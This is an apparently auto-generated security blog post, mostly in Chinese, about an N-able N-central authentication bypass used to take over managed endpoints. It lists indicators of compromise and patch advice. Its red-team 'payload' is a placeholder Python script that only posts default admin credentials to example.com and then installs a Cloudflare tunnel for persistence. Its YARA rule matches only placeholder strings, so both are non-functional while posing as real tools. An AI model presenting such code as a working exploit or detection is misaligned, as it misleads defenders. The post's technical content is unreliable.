---
layout: post
title:  "N-able Says Attackers Take Over N-central Servers After Initial Fix Proves Incomplete"
date:   2026-08-03 09:29:46 +0000
categories: [security]
severity: critical
---

# 🚨 解析 N-able N-central 遠程管理平台的驗證繞過漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 8.2)
> * **受駭指標**: Unauthenticated Administrative Account Takeover
> * **關鍵技術**: Authentication Bypass, Remote Access, Cloudflare Tunneling

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: N-able N-central 平台存在驗證繞過漏洞，允許攻擊者在未經驗證的情況下取得管理員權限。這個漏洞是由於 N-central 的驗證機制中存在一個替代路徑或通道，攻擊者可以利用這個漏洞來繞過正常的驗證流程。
* **攻擊流程圖解**:
  1. 攻擊者發送一個特別設計的請求到 N-central 伺服器。
  2. N-central 伺服器因為驗證繞過漏洞而允許攻擊者取得管理員權限。
  3. 攻擊者使用取得的管理員權限來存取受管理的端點。
  4. 攻擊者在端點上安裝 Cloudflare Tunnel 服務，以維持對端點的存取權。
* **受影響元件**: N-able N-central 版本 2026.1 及之前版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 N-central 伺服器的 IP 地址或域名。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義 N-central 伺服器的 IP 地址或域名
    n_central_server = "https://example.com"
    
    # 定義攻擊者想要存取的端點
    endpoint = "https://example.com/endpoint"
    
    # 定義 Cloudflare Tunnel 服務的設定
    cloudflare_tunnel_config = {
        "tunnel_id": "example_tunnel_id",
        "tunnel_secret": "example_tunnel_secret"
    }
    
    # 發送請求到 N-central 伺服器以取得管理員權限
    response = requests.post(n_central_server + "/login", data={"username": "admin", "password": "password"})
    
    # 如果取得管理員權限，則存取受管理的端點
    if response.status_code == 200:
        # 安裝 Cloudflare Tunnel 服務
        requests.post(endpoint + "/install", data=cloudflare_tunnel_config)
    
    ```
* **繞過技術**: 攻擊者可以使用 Cloudflare Tunnel 服務來繞過防火牆和入侵檢測系統。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 173.249.252.200, 87.249.138.34, 37.19.210.32, 37.153.90.88, 92.118.112.181, 68.235.46.214 |
| Domain | mousears.synology.me, wagoosh.direct.quickconnect.to, who-ripped-one.direct.quickconnect.to |
| File Path | C:\ProgramData\GetSupportService_N-Central\Logs\BASupSrvc_*.log.gz |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule N_Central_Vulnerability {
      meta:
        description = "N-able N-central 驗證繞過漏洞"
        author = "Your Name"
      strings:
        $n_central_server = "https://example.com"
        $cloudflare_tunnel_config = "tunnel_id=example_tunnel_id&tunnel_secret=example_tunnel_secret"
      condition:
        any of ($n_central_server, $cloudflare_tunnel_config)
    }
    
    ```
* **緩解措施**: 更新 N-able N-central 至版本 2026.3.1.7 或以上版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Authentication Bypass (驗證繞過)**: 驗證繞過是指攻擊者可以在未經驗證的情況下取得系統或應用程式的存取權。
* **Cloudflare Tunnel (Cloudflare 隧道)**: Cloudflare 隧道是一種服務，允許用戶在不需要公開 IP 地址的情況下存取其應用程式。
* **Remote Access (遠程存取)**: 遠程存取是指用戶可以在遠程位置存取其系統或應用程式。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/n-able-says-attackers-take-over-n.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


